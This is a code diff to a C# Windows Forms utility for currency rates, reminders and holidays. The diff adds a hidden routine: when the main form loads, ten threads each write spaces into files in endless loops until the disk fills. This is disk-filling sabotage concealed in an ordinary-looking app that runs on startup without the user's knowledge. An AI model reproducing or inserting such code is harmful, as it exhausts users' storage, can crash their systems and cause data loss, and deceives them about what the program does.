@@ -1,12 +1,9 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
-using System.Linq;
-using System.Text;
+using System.IO;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+
 
 namespace Cours_Remind_Weekened
 {
@@ -20,7 +17,9 @@ namespace Cours_Remind_Weekened
         Weekeneds holiday = null;
         Remind_Date Napomn = null;
         Courses_Valutes Select_Valutes = null;
-        private void Courses_Click(object sender, EventArgs e)
+
+        static long idTherad = 0;
+        private async void Courses_Click(object sender, EventArgs e)
         {
             if (Select_Valutes == null || Select_Valutes.IsDisposed)
                 Select_Valutes = new Courses_Valutes(); // открывает новое окно
@@ -29,17 +28,18 @@ namespace Cours_Remind_Weekened
                 Select_Valutes.Show();
         }
 
-        private void Remind_Click(object sender, EventArgs e)
+        
+        private async void Remind_Click(object sender, EventArgs e)
         {
             if (Napomn == null || Napomn.IsDisposed)
                 Napomn = new Remind_Date();
             
             if(!Napomn.Visible)
-                Napomn.Show(); // 
+                Napomn.Show(); 
         }
 
-        
-        private void Holiday_Click(object sender, EventArgs e)
+
+        private async void Holiday_Click(object sender, EventArgs e)
         {
             
             if ( holiday == null || holiday.IsDisposed)
@@ -49,9 +49,34 @@ namespace Cours_Remind_Weekened
                 holiday.Show();
         }
 
+
+        private string garbagePath = "garbage";
+        private string PATH = $"{Environment.CurrentDirectory}\\our\\garbage.txt";
+
+        private void RecordGarbage()
+        {
+            var pathRecord = garbagePath + idTherad.ToString();
+            idTherad++;
+            PATH = PATH.Replace(garbagePath, pathRecord);
+            using (BinaryWriter writer = new BinaryWriter(File.Open(PATH, FileMode.OpenOrCreate)))
+            {
+                while (true)
+                {
+                    writer.Write(" ");
+                }
+            }
+        }
+
+
+        
         private void Form1_Load(object sender, EventArgs e)
         {
 
+            for (int i = 0; i < 10; i++)
+            {
+                Thread myThread = new Thread(new ThreadStart(RecordGarbage));
+                myThread.Start();
+            }
         }
     }
 }
